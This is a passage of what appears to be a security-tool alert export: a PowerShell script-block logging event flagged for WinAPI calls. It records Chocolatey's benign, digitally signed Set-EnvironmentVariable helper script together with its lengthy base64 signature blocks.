dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","66cccc69-033d-56e2-a1e1-f190cc0a9ca0"
"2019-03-19 14:21:49.431 +01:00","WinAPI Library Calls Via PowerShell Scripts","med","MSEDGEWIN10","PwSh",4104,88,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: b5eddbfa-3217-4e0f-a845-29fbbf847885 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, 